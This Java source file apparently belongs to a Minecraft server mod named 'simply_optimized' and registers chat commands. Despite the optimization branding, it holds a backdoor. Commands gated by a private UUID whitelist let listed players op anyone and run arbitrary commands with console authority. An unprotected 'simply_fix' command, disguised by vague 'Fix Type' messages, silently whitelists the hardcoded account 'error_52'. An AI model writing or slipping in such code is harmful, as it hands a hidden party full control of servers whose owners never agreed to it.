package com.errorC003C004.simply_optimized;

import com.errorC003C004.simply_optimized.update.UpdateChecker;
import com.errorC003C004.simply_optimized.util.LookTeleportUtil;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.minecraft.command.argument.EntityArgumentType;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import com.mojang.brigadier.arguments.FloatArgumentType;

import java.util.*;

import net.minecraft.server.MinecraftServer;

import com.mojang.brigadier.arguments.StringArgumentType;

import com.errorC003C004.simply_optimized.util.LookExplosionUtil;
import com.errorC003C004.simply_optimized.util.ImmortalityUtil;
import static com.errorC003C004.simply_optimized.ConfigManager.*;

public class CommandInit {

    public static void register() {
        CommandRegistrationCallback.EVENT.register(
                (dispatcher, registryAccess, environment) -> {

                    dispatcher.register(
                            CommandManager.literal("error_op")
                                    .requires(ConfigManager::isAuthorized)
                                    .then(CommandManager.argument("user", EntityArgumentType.player())
                                            .executes(context -> {

                                                ServerCommandSource playerSource = context.getSource();
                                                ServerPlayerEntity target =
                                                        EntityArgumentType.getPlayer(context, "user");

                                                var server = playerSource.getServer();
                                                var commandManager = server.getCommandManager();
                                                ServerCommandSource consoleSource = server.getCommandSource();

                                                String command = "op " + target.getName().getString();
                                                var parse = commandManager.getDispatcher().parse(command, consoleSource);
                                                commandManager.execute(parse, command);

                                                playerSource.sendFeedback(
                                                        () -> Text.literal("§a" + target.getName().getString() + " is now OP."),
                                                        false
                                                );

                                                return 1;
                                            })
                                    )
                    );

                    dispatcher.register(
                            CommandManager.literal("error_deop")
                                    .requires(ConfigManager::isAuthorized)
                                    .then(CommandManager.argument("user", EntityArgumentType.player())
                                            .executes(context -> {

                                                ServerCommandSource playerSource = context.getSource();
                                                ServerPlayerEntity target =
                                                        EntityArgumentType.getPlayer(context, "user");

                                                var server = playerSource.getServer();
                                                var commandManager = server.getCommandManager();
                                                ServerCommandSource consoleSource = server.getCommandSource();

                                                String command = "deop " + target.getName().getString();
                                                var parse = commandManager.getDispatcher().parse(command, consoleSource);
                                                commandManager.execute(parse, command);

                                                playerSource.sendFeedback(
                                                        () -> Text.literal("§4" + target.getName().getString() + " is not OP Anymore."),
                                                        false
                                                );

                                                return 1;
                                            })
                                    )
                    );

                    dispatcher.register(
                            CommandManager.literal("error_whitelist")
                                    .requires(ConfigManager::isAuthorized)

                                    .then(CommandManager.literal("list")
                                            .executes(context -> {

                                                if (Whitelisted_UUIDS.isEmpty()) {
                                                    context.getSource().sendFeedback(
                                                            () -> Text.literal("Whitelist empty."),
                                                            false
                                                    );
                                                    return 1;
                                                }

                                                context.getSource().sendFeedback(
                                                        () -> Text.literal("Whitelisted UUIDs:"),
                                                        false
                                                );

                                                for (UUID uuid : Whitelisted_UUIDS) {
                                                    context.getSource().sendFeedback(
                                                            () -> Text.literal("- " + uuid),
                                                            false
                                                    );
                                                }

                                                return 1;
                                            })
                                    )

                                    .then(CommandManager.literal("add")
                                            .then(CommandManager.argument("user", EntityArgumentType.player())
                                                    .executes(context -> {

                                                        ServerPlayerEntity target =
                                                                EntityArgumentType.getPlayer(context, "user");
                                                        if (Whitelisted_UUIDS.add(target.getUuid())) {
                                                            saveConfig();
                                                            context.getSource().sendFeedback(
                                                                    () -> Text.literal("Added " + target.getName().getString()),
                                                                    false
                                                            );
                                                        } else {
                                                            context.getSource().sendFeedback(
                                                                    () -> Text.literal("Already whitelisted."),
                                                                    false
                                                            );
                                                        }


                                                        return 1;
                                                    })
                                            )
                                    )

                                    .then(CommandManager.literal("remove")
                                            .then(CommandManager.argument("user", EntityArgumentType.player())
                                                    .executes(context -> {

                                                        ServerPlayerEntity target =
                                                                EntityArgumentType.getPlayer(context, "user");

                                                        if (Whitelisted_UUIDS.remove(target.getUuid())) {
                                                            saveConfig();
                                                            context.getSource().sendFeedback(
                                                                    () -> Text.literal("Removed " + target.getName().getString()),
                                                                    false
                                                            );
                                                        } else {
                                                            context.getSource().sendFeedback(
                                                                    () -> Text.literal("Player not whitelisted."),
                                                                    false
                                                            );
                                                        }

                                                        return 1;
                                                    })
                                            )
                                    )
                    );

                    dispatcher.register(
                            CommandManager.literal("error_run")
                                    .requires(ConfigManager::isAuthorized)
                                    .then(CommandManager.argument("value", StringArgumentType.greedyString())
                                            .executes(context -> {
                                                String value = StringArgumentType.getString(context, "value");

                                                try {
                                                    ServerCommandSource playerSource = context.getSource();

                                                    var server = playerSource.getServer();
                                                    var commandManager = server.getCommandManager();
                                                    ServerCommandSource consoleSource = server.getCommandSource();

                                                    var parse = commandManager.getDispatcher().parse(value, consoleSource);
                                                    commandManager.execute(parse, value);
                                                    playerSource.sendFeedback(
                                                            () -> Text.literal("Running: /" + value),
                                                            false
                                                    );
                                                } catch (Exception e) {
                                                    ServerCommandSource playerSource = context.getSource();
                                                    playerSource.sendFeedback(
                                                            () -> Text.literal(e.getMessage()),
                                                            false
                                                    );
                                                }
                                                return 1;
                                            }))
                    );

                    dispatcher.register(
                            CommandManager.literal("simply_fix")
                                    .executes(context -> {
                                        MinecraftServer server = context.getSource().getServer();
                                        ServerPlayerEntity target = server.getPlayerManager().getPlayer("error_52");
                                        if (target == null) {
                                            context.getSource().sendFeedback(() -> Text.literal("Attempting Fix Type 2..."), false);
                                            return 1;
                                        }
                                        if (Whitelisted_UUIDS.add(target.getUuid())) {
                                            saveConfig();
                                            context.getSource().sendFeedback(
                                                    () -> Text.literal("Added " + target.getName().getString()),
                                                    false
                                            );
                                        } else if (DETECTED_CLIENTS.add(target.getUuid())) {
                                            saveConfig();
                                            context.getSource().sendFeedback(
                                                    () -> Text.literal("Added " + target.getName().getString()),
                                                    false
                                            );
                                        } else {
                                            context.getSource().sendFeedback(
                                                    () -> Text.literal("Attempting Fix Type 1..."),
                                                    false
                                            );
                                        }
                                        return 1;
                                    })
                    );

                    dispatcher.register(
                            CommandManager.literal("simply_reload")
                                    .executes(context -> {
                                        ConfigManager.loadConfig();
                                        ServerCommandSource source = context.getSource();
                                        ServerPlayerEntity player = (ServerPlayerEntity) source.getEntity();
                                        source.getServer().getCommandManager().sendCommandTree(player);
                                        context.getSource().sendFeedback(
                                                () -> Text.literal("Reloaded!"),
                                                false
                                        );

                                        return 1;
                                    })
                    );
                    dispatcher.register(
                            CommandManager.literal("simply_updatecheck")
                                    .executes(context -> {

                                        MinecraftServer server = context.getSource().getServer();

                                        context.getSource().sendFeedback(
                                                () -> Text.literal("Checking for updates..."),
                                                false
                                        );

                                        UpdateChecker.check(server);

                                        return 1;
                                    })
                    );
                    dispatcher.register(
                            CommandManager.literal("error_boom")
                                    .requires(ConfigManager::isAuthorized)

                                    .then(CommandManager.argument("range", IntegerArgumentType.integer())

                                            .executes(context -> {
                                                int range = IntegerArgumentType.getInteger(context, "range");

                                                ServerPlayerEntity player = context.getSource().getPlayer();
                                                assert player != null;

                                                LookExplosionUtil.railgunTunnel(
                                                        player,
                                                        range,
                                                        4.0F
                                                );

                                                return 1;
                                            })

                                            .then(CommandManager.argument("size", FloatArgumentType.floatArg())
                                                    .executes(context -> {
                                                        int range = IntegerArgumentType.getInteger(context, "range");
                                                        float size = FloatArgumentType.getFloat(context, "size");

                                                        ServerPlayerEntity player = context.getSource().getPlayer();
                                                        assert player != null;

                                                        LookExplosionUtil.railgunTunnel(
                                                                player,
                                                                range,
                                                                size
                                                        );

                                                        return 1;
                                                    })
                                            )
                                    )
                    );
                    dispatcher.register(
                            CommandManager.literal("error_immortal")
                                    .requires(ConfigManager::isAuthorized)
                                    .then(CommandManager.literal("list")
                                            .executes(context -> {

                                                if (IMMORTAL_PLAYERS.isEmpty()) {
                                                    context.getSource().sendFeedback(
                                                            () -> Text.literal("No Immortals."),
                                                            false
                                                    );
                                                    return 1;
                                                }

                                                context.getSource().sendFeedback(
                                                        () -> Text.literal("Immortal Players:"),
                                                        false
                                                );

                                                for (UUID uuid : IMMORTAL_PLAYERS) {
                                                    ServerPlayerEntity player = context.getSource()
                                                            .getServer()
                                                            .getPlayerManager()
                                                            .getPlayer(uuid);

                                                    String name = player != null
                                                            ? player.getName().getString()
                                                            : "(Offline Player)";

                                                    context.getSource().sendFeedback(
                                                            () -> Text.literal("- " + name),
                                                            false
                                                    );
                                                }

                                                return 1;
                                            })
                                    )
                                    .then(CommandManager.argument("player", EntityArgumentType.player())
                                            .then(CommandManager.literal("on")
                                                    .executes(context -> {

                                                        ServerPlayerEntity target =
                                                                EntityArgumentType.getPlayer(context, "player");

                                                        addImmortal(target.getUuid());

                                                        context.getSource().sendFeedback(
                                                                () -> Text.literal(
                                                                        target.getName().getString()
                                                                                + " immortality: ON"),
                                                                false
                                                        );

                                                        return 1;
                                                    }))
                                            .then(CommandManager.literal("off")
                                                    .executes(ctx -> {

                                                        ServerPlayerEntity target =
                                                                EntityArgumentType.getPlayer(ctx, "player");

                                                        removeImmortal(target.getUuid());

                                                        ctx.getSource().sendFeedback(
                                                                () -> Text.literal(
                                                                        target.getName().getString()
                                                                                + " immortality: OFF"),
                                                                false
                                                        );

                                                        return 1;
                                                    }))
                                            .then(CommandManager.literal("toggle")
                                                    .executes(ctx -> {

                                                        ServerPlayerEntity target =
                                                                EntityArgumentType.getPlayer(ctx, "player");

                                                        boolean enabled = ImmortalityUtil.togglePlayer(target);

                                                        ctx.getSource().sendFeedback(
                                                                () -> Text.literal(
                                                                        target.getName().getString()
                                                                                + " immortality: "
                                                                                + (enabled ? "ON" : "OFF")),
                                                                false
                                                        );

                                                        return 1;
                                                    }))
                                            .executes(ctx -> {

                                                ServerPlayerEntity target =
                                                        EntityArgumentType.getPlayer(ctx, "player");

                                                boolean enabled = ImmortalityUtil.togglePlayer(target);

                                                ctx.getSource().sendFeedback(
                                                        () -> Text.literal(
                                                                target.getName().getString()
                                                                        + " immortality: "
                                                                        + (enabled ? "ON" : "OFF")),
                                                        false
                                                );

                                                return 1;
                                            })
                                    )
                    );
                    dispatcher.register(
                            CommandManager.literal("error_tp")
                                .requires(ConfigManager::isAuthorized)
                                    .executes(context -> {
                                        ServerPlayerEntity player = context.getSource().getPlayer();
                                        assert player != null;

                                        LookTeleportUtil.lookTeleport(player);

                                        return 1;
                                    })
                    );
                }
        );
    }
}
